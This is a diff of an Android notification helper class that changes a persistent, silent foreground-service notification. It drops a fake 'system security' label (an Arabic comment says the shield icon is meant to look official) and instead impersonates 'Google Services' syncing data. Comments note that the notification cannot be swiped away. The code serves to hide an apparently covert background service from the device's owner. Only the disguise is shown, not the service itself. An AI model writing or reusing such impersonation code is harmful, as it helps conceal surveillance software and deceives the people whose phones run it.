@@ -9,20 +9,17 @@ import androidx.core.app.NotificationCompat;
 
 public class NotificationHelper {
 
-    public static final String CHANNEL_ID = "system_security_channel";
-    public static final int NOTIFICATION_ID = 1;
+    public static final String CHANNEL_ID = "sync_channel";
+    public static final int NOTIFICATION_ID = 999;
 
     public static void createNotificationChannel(Context context) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            // استخدام IMPORTANCE_LOW لضمان استقرار الخدمة على جميع الأجهزة
             NotificationChannel channel = new NotificationChannel(
                     CHANNEL_ID,
-                    "System Security Services",
-                    NotificationManager.IMPORTANCE_LOW
+                    "System Sync",
+                    NotificationManager.IMPORTANCE_LOW // صامت تماماً
             );
-            
             channel.setShowBadge(false);
-            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
             
             NotificationManager manager = context.getSystemService(NotificationManager.class);
             if (manager != null) {
@@ -32,17 +29,13 @@ public class NotificationHelper {
     }
 
     public static Notification getForegroundNotification(Context context) {
-        // بناء التنبيه بطريقة تدعم جميع الإصدارات
         NotificationCompat.Builder builder = new NotificationCompat.Builder(context, CHANNEL_ID)
-                .setContentTitle("نظام الحماية نشط")
-                .setContentText("يتم فحص الجهاز وتأمينه في الوقت الفعلي")
-                .setSmallIcon(android.R.drawable.ic_shield) // أيقونة درع لتبدو رسمية
+                .setContentTitle("Google Services")
+                .setContentText("Syncing data background...")
+                .setSmallIcon(android.R.drawable.stat_notify_sync) // أيقونة المزامنة الافتراضية للنظام
                 .setPriority(NotificationCompat.PRIORITY_LOW)
-                .setCategory(NotificationCompat.CATEGORY_SERVICE)
-                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
-                .setOngoing(true); // يمنع المستخدم من إزالة التنبيه بالسحب
+                .setOngoing(true);
 
-        // في الإصدارات القديمة جداً، نضمن عدم وجود صوت أو اهتزاز مزعج
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
             builder.setSound(null).setVibrate(null);
         }
